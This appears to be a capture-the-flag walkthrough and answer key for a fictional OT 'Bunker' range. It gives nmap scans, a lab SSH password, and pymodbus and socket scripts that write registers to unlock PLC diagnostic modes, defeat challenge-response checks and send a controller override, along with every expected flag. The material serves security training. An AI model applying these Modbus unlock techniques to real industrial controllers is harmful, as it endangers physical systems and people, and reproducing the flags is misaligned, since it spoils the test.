# Flags 31–36: Bunker

> **Start here:** Read [00-range-access-docker.md](00-range-access-docker.md) for how to access the Docker compose range.

These flags live behind the splice landing box (A9), which is the gateway into the Bunker OT network (172.20.50.0/24). In production, Kali gets a link to A9 after flag 19 (the generator explosion) fires. In this range the link (`splice-link`, 172.20.60.0/24) is pre-wired — A9 is reachable from Kali out of the box as `splice-relay` / `172.20.60.5`.

**Prerequisite — A7 playbooks and source:** several bunker flags reference content from the A7 Gitea repos (`aurora/manufacturing-orchestrator` for the PLC diag procedures, `aurora/weapons-integration` for `brain_client.py`, `aurora/navigation-controller` for the brain auth token). A7 lives on the lab network and is **not** reachable from A9 or Kali. You must have cloned those repos during the Lab phase from inside the A16 SSH session (flag 24's `.netrc` chain works for every one of them). Keep the A16 shell open alongside the A9 shell so you can cross-reference the already-cloned repos while working bunker flags.

From Kali, SSH into A9:

```
ssh root@splice-relay
# password: splice2025
```

A14 is **not** on the Bunker OT network itself. A9 is the only host with a route to the four controllers, so all work for flags 31–36 runs from inside the A9 shell:

- A10 tail: 172.20.50.10:502 (Modbus/TCP) — hostname `tail-ctrl`
- A11 leg: 172.20.50.11:502 (Modbus/TCP) — hostname `leg-ctrl`
- A12 arms: 172.20.50.12:502 (Modbus/TCP) — hostname `arms-ctrl`
- A13 brain: 172.20.50.50:9100 (custom binary TCP) — hostname `brain-main`

A9 ships with `nmap`, `ncat`, `tcpdump`, `python3`, `pymodbus`, and the helper script `/usr/local/bin/modbus_client.py`.

---

## Flag 31 — OT Network Enumeration (Medium, 100pts)

1. From the splice landing box (A9), scan the OT network. Pre-populated scan results are at `/root/scan_results.txt`, or run:
   ```
   nmap -sV -p 502,9100 172.20.50.0/24
   ```
   You'll find four hosts: 172.20.50.10, .11, .12 (Modbus/TCP 502) and 172.20.50.50 (TCP 9100).

2. Query each controller's device identification using Modbus function code 43. Use the helper script:
   ```
   python3 /usr/local/bin/modbus_client.py 172.20.50.10 devid
   python3 /usr/local/bin/modbus_client.py 172.20.50.11 devid
   python3 /usr/local/bin/modbus_client.py 172.20.50.12 devid
   ```
   Each returns a model number (in `ProductName`/`ModelName`) plus a user-application-name string that embeds the serial:
   - 172.20.50.10: model `AHS-TAIL-7741`, app name `Tail Articulation Controller v2.4 -- SN: AHS-T-00482 -- maintenance mode: write reg 20=3`
   - 172.20.50.11: model `AHS-LEG-MN07`, app name `Leg Locomotion Controller v2.4 -- SN: AHS-L-00483 -- calibration: gait sequence 0->1->2->0`
   - 172.20.50.12: model `AHS-ARM-AL42`, app name `Arms Weapons Controller v2.4 -- SN: AHS-A-00484 -- diagnostics: coil 50`

   Keep both the **models** and the **serials** — flag 31 wants the models, flag 32 and flag 35 want the serials.

3. Concatenate the three model numbers in network order: `AHS-TAIL-7741AHS-LEG-MN07AHS-ARM-AL42`

4. Submit to CTFd.

**Expected flag:** `FLAG{2e8c0a5d7f3b1946}` (static flag for this challenge)

---

## Flag 32 — Tail Motor Controller Data (Hard, 200pts)

1. Read the manufacturing-orchestrator Ansible playbooks from A7 (Gitea). In `deploy_combat_ai.yml`, the tail controller section says:
   > Diagnostic mode (register 20 = 3) enables full register access. Access diagnostic registers by writing mode 3, then providing the controller serial number to register 99.

2. Pull the tail controller's serial from its devid response (flag 31 step 2 — it's in the `UserApplicationName` field as `SN: AHS-T-00482`). The challenge value is the last 3 digits: `482`.

3. Execute the unlock sequence via Modbus:
   ```python
   from pymodbus.client import ModbusTcpClient
   c = ModbusTcpClient("172.20.50.10", port=502)
   c.connect()
   c.write_register(address=20, value=3)    # diagnostic mode
   c.write_register(address=99, value=482)  # serial challenge
   ```

4. Read the flag from registers 100-123:
   ```python
   r = c.read_holding_registers(address=100, count=24)
   flag = "".join(chr(v) for v in r.registers if v > 0)
   print(flag)
   ```

**Expected flag:** `FLAG{9b3e7c1d0f5a2846}`

---

## Flag 33 — Leg Joint Actuator Data (Hard, 200pts)

1. Read the manufacturing-orchestrator playbooks from A7. The leg controller section describes:
   > The leg controller requires a specific gait mode sequence to enter calibration mode: 0 → 1 → 2 → 0 (stationary → walk → run → stationary) within 10 seconds. After successful sequence, input register 60 returns a 4-digit calibration code. Write this code to register 99.

2. Execute the sequence via Modbus:
   ```python
   from pymodbus.client import ModbusTcpClient
   import time
   c = ModbusTcpClient("172.20.50.11", port=502)
   c.connect()
   for mode in [0, 1, 2, 0]:
       c.write_register(address=30, value=mode)
       time.sleep(1)
   ```

3. Read the calibration code:
   ```python
   time.sleep(1)
   r = c.read_input_registers(address=60, count=1)
   code = r.registers[0]
   print(f"Code: {code}")
   ```

4. Write the code to register 99:
   ```python
   c.write_register(address=99, value=code)
   ```

5. Read the flag from registers 100-123:
   ```python
   r = c.read_holding_registers(address=100, count=24)
   flag = "".join(chr(v) for v in r.registers if v > 0)
   print(flag)
   ```

**Expected flag:** `FLAG{c7a1e3f9d0b52864}`

---

## Flag 34 — Arms Controller / Weapons Integration (Hard, 200pts)

1. The arms controller uses a rolling challenge-response. From the A7 playbooks you learn to enable diagnostics via coil 50, then read a challenge from input register 60.

2. You also need the PO number `2847` from the Front Office (A4 file share, `PO-2847_hydraulic_actuators.pdf`). This is the XOR key.

3. Execute the challenge-response:
   ```python
   from pymodbus.client import ModbusTcpClient
   import time
   c = ModbusTcpClient("172.20.50.12", port=502)
   c.connect()

   c.write_coil(address=50, value=True)          # enable diagnostics
   time.sleep(0.5)
   r = c.read_input_registers(address=60, count=1)
   nonce = r.registers[0]                         # read challenge nonce

   response = nonce ^ 2847                        # XOR with PO number
   c.write_register(address=200, value=response)  # send response
   time.sleep(0.5)

   r = c.read_holding_registers(address=201, count=1)
   print(f"Confirmed: {r.registers[0]}")          # should be 1
   ```

4. If confirmation is 1, read the flag:
   ```python
   r = c.read_holding_registers(address=100, count=24)
   flag = "".join(chr(v) for v in r.registers if v > 0)
   print(flag)
   ```

**Note:** The nonce changes every 30 seconds. You must complete the read-XOR-write within the same window.

**Expected flag:** `FLAG{f0d8b2e6a4c71935}`

---

## Flag 35 — Mecha-Godzilla Brain Access (Expert, 300pts)

1. The brain at 172.20.50.50:9100 speaks a custom binary protocol. Connecting with plain netcat shows garbled bytes — that's the 8-byte challenge.

2. Find the protocol documentation in A7: clone `aurora/weapons-integration` and read `src/brain_client.py`. It documents:
   - Server sends 8-byte challenge
   - Client XORs each byte with a key: `SHA256(tail_serial + leg_serial + arms_serial)[:8]`
   - Serials come from the Modbus device identification query on A10/A11/A12 (flag 31 step 2 — the `UserApplicationName` field carries `SN: AHS-T-00482`, `SN: AHS-L-00483`, `SN: AHS-A-00484` alongside the model number).

3. Get the auth token from A7: clone `aurora/navigation-controller` and read `config.yaml`:
   ```yaml
   brain_connection:
     auth_token: "a4f8e2c1d7b03965e8f2a1c4d7b03965"
   ```

4. Write a client script:
   ```python
   import socket, hashlib

   serials = "AHS-T-00482" + "AHS-L-00483" + "AHS-A-00484"
   key = hashlib.sha256(serials.encode()).digest()[:8]

   s = socket.socket()
   s.connect(("172.20.50.50", 9100))
   challenge = s.recv(8)
   response = bytes(c ^ k for c, k in zip(challenge, key))
   s.sendall(response)
   ```

5. After successful handshake, authenticate:
   ```
   Username: vasik
   Password: a4f8e2c1d7b03965e8f2a1c4d7b03965
   ```

6. Type `status`. The output includes:
   ```
   SYSTEM AUTHORIZATION TOKEN: FLAG{8d2f5a0e7c9b3146}
   ```

**Expected flag:** `FLAG{8d2f5a0e7c9b3146}`

---

## Flag 36 — Combat System Seized (Expert, 300pts)

1. After authenticating to the brain (flag 35), you need the override code. It's assembled from three pieces found across the range:

   | Piece | Value | Source |
   |-------|-------|--------|
   | First 4 chars | `7741` | A0 website: Boreas registration number on /about page |
   | Middle 4 chars | `MN07` | A6 workstation: MIDNIGHT-7 simulation ID in `MIDNIGHT-7_results.dat` |
   | Last 4 chars | `AL42` | A8 database: `compartment_c.assembly_log` FINAL ASSEMBLY row, JSONB path `metadata->'integration'->'code'` |

2. Assemble the code: `7741-MN07-AL42`

3. In the brain controller, type:
   ```
   override 7741-MN07-AL42
   ```

4. The response:
   ```
   OVERRIDE ACCEPTED.
   CONTROL TRANSFERRED TO: POLARIS OPERATOR
   COMBAT AI: UNDER NEW MANAGEMENT.

   OPERATION NORTHSTORM: COMPLETE.

   FLAG{0b7e3d9a1f6c4258}
   ```

**Expected flag:** `FLAG{0b7e3d9a1f6c4258}`
